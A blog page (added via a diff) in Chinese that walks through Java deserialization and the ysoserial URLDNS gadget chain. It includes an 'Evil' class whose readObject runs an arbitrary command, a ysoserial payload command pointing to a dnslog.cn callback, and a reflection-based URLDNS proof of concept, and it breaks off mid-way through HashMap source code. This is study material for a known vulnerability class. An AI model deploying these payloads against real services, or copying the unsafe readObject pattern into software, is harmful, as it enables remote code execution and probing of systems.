@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Pan3a">
+    
+    <title>
+        
+            URLDNS分析 |
+        
+        Pan3a&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/pan3a.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/pan3a.svg","favicon":"/images/pan3a.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/colorful-neon-city-4k-tx.jpeg","description":null},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pan3a's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Pan3a&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               target="_blank" rel="noopener" href="https://www.github.com/pan3a"
+                            >
+                                GITHUB
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       target="_blank" rel="noopener" href="https://www.github.com/pan3a">GITHUB</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">URLDNS分析</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/pan3a.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Pan3a</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2021-11-23 10:51:00</span>
+        <span class="mobile">2021-11-23 10:51</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.6k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>13 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <ul>
+<li>学习了很久的<code>Java</code>基础，也看了很多的Java反序列化分析，现在也来分析学习哈最基础的<code>URLDNS</code>反序列化吧。</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Java反序列化基础"><a href="#Java反序列化基础" class="headerlink" title="Java反序列化基础"></a>Java反序列化基础</h1><ul>
+<li><p>为了方便数据的存储，于是乎有了现在的<code>Java</code>序列化于反序列化。序列化就是将<code>Java</code>对象存储到一个文件，反序列化则是读取序列化生产的文件，还原<code>Java</code>对象，常见的基础反序列化。</p>
+</li>
+<li><p>首先类需要实现<code>Serializable</code>这个接口，虽然这个接口里面没有东西，但是不实现这个接口则无法序列化。用<code>transient</code> 关键字修饰的属性除外，不参与序列化过程。</p>
+</li>
+<li><p><code>ObjectOutputStream.writeObject()</code>序列化对象。</p>
+</li>
+<li><p><code>ObjectInputStream.readObject()</code>读取我们的对象，这里也是我们反序列化的利用点。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SerializeAndUnserialize.java</span></span><br><span class="line"><span class="keyword">package</span> JavaSecurity.URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeAndUnSerialize</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        正常反序列化</span></span><br><span class="line">        serializeToFile(<span class="string">&quot;User.ser&quot;</span>);</span><br><span class="line">        unSerializeToObject(<span class="string">&quot;User.ser&quot;</span>);</span><br><span class="line"><span class="comment">//        恶意反序列化</span></span><br><span class="line">        evilObject(<span class="string">&quot;Evil.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serializeToFile</span><span class="params">(String file)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerializeToObject</span><span class="params">(String file)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        User user = (User)objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">        user.setName(<span class="string">&quot;Forever404&quot;</span>);</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">evilObject</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Evil evil = <span class="keyword">new</span> Evil();</span><br><span class="line">        evil.command = <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        objectOutputStream.writeObject(evil);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream objectOutputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        objectOutputStream.defaultWriteObject();</span><br><span class="line">        objectOutputStream.writeObject(<span class="string">&quot;Hello, This is writeObject!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line">        String message = (String) objectInputStream.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String command;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>输出</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, This is writeObject!!</span><br><span class="line">Pan3a</span><br><span class="line">Forever404</span><br></pre></td></tr></table></figure></li>
+<li><p>这里序列化生成的数据。</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637581469798-338ea259-cafc-4a09-8f4a-e8e5ff9ab659.png"
+                      alt="image.png"
+                ></p>
+<ul>
+<li>分析<code>Evil</code>类，这里控制了该类的<code>readObject</code>方法，那么则可能造成漏洞。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637583894728-649fab4a-82cb-4856-80e4-ae285f5ebf20.png"
+                      alt="image.png"
+                ></p>
+<h1 id="Ysoserial"><a href="#Ysoserial" class="headerlink" title="Ysoserial"></a>Ysoserial</h1><ul>
+<li><p><code>ysoserial</code>是一个<code>Java</code>反序列化漏洞利用工具，通常用于检测是否存在Java反序列化漏洞。</p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial" >https://github.com/frohoff/ysoserial<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>这里可以将其克隆下来再将其打包成jar文件即可，然后会在生成一个<code>target</code>目录，里面就有生成的jar。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637584740751-433c2d8f-f71d-44df-81a7-3cf6d781f715.png"
+                      alt="image.png"
+                ></p>
+<h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2></li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="http://www.dnslog.cn/" >http://www.dnslog.cn/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>获取一个DNS。</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637585927730-54584a80-0974-4f65-be66-e7c24099a13b.png"
+                      alt="image.png"
+                ></p>
+<ul>
+<li>生成我们的<code>payload</code>。</li>
+<li><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;[http://0ehcf6.dnslog.cn&quot;](http://0ehcf6.dnslog.cn&quot;) &gt; ~/Temp/URLDNS.ser</code></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637586359448-487d68c3-6b2b-4f8b-aa8b-be728ba27c30.png"
+                      alt="image.png"
+                ></p>
+<h2 id="编写漏洞代码"><a href="#编写漏洞代码" class="headerlink" title="编写漏洞代码"></a>编写漏洞代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URLDNSYsoSerialTest</span></span><br><span class="line"><span class="keyword">package</span> JavaSecurity.URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNSYsoSerialTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;/Users/pan3a/Temp/URLDNS.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DNS获取到请求记录。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637586753691-8d6263c9-5d40-4d87-b705-e878b9a6b343.png"
+                      alt="image.png"
+                ></p>
+<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><ul>
+<li><p><code>URLDNS</code>，它的功能正如其名发起DNS请求，因此无法回显，只能检测Java反序列化漏洞，构造好测试代码，然后开始调试。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaSecurity.URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNSPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        urlDns();</span><br><span class="line">        unSerializeToObject(<span class="string">&quot;urlDns.ser&quot;</span>);</span><br><span class="line"><span class="comment">//        addressGetByName();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">urlDns</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://pjm4n7.dnslog.cn&quot;</span>);</span><br><span class="line">        Class&lt;? &gt; clazz = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        Field field = clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        field.set(url, -<span class="number">1</span>);</span><br><span class="line">        serializeToFile(<span class="string">&quot;urlDns.ser&quot;</span>, hashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serializeToFile</span><span class="params">(String file,Object object)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerializeToObject</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//   最后发现是由getByName函数发起DNS请求，测试证明。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addressGetByName</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://pjm4n7.dnslog.cn&quot;</span>);</span><br><span class="line">        String host = url.getHost();</span><br><span class="line">        InetAddress addr = InetAddress.getByName(host);</span><br><span class="line">        String domainName = addr.getHostName();<span class="comment">//获得主机名</span></span><br><span class="line">        String IPName = addr.getHostAddress();<span class="comment">//获得IP地址</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hostname:&quot;</span> + domainName);</span><br><span class="line">        System.out.println(<span class="string">&quot;IPName:&quot;</span> + IPName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>由于知道网上的利用链（<code>Gatget Chain</code>）是在<code>HashMap</code>的<code>readObject</code>方法触发的，因此我们直接在<code>HashMap</code>的<code>readObject</code>方法处下断点位置下断点即可，有些可能因为<code>IDEA</code>默认配置有个黑名单调试时不进入某些类，我们直接取消该选项。（因个人喜而异，能调试都可以。）</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637598331353-d48d974a-b323-4924-8224-6745a5f1c08f.png"
+                      alt="image.png"
+                ></p>
+<ul>
+<li>在<code>HashMap</code>类的<code>1367</code>行进入了调试模式，接下来继续向下跟。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637598713275-4f0c26d7-768e-432e-a442-fe8a398a9f86.png"
+                      alt="image.png"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = 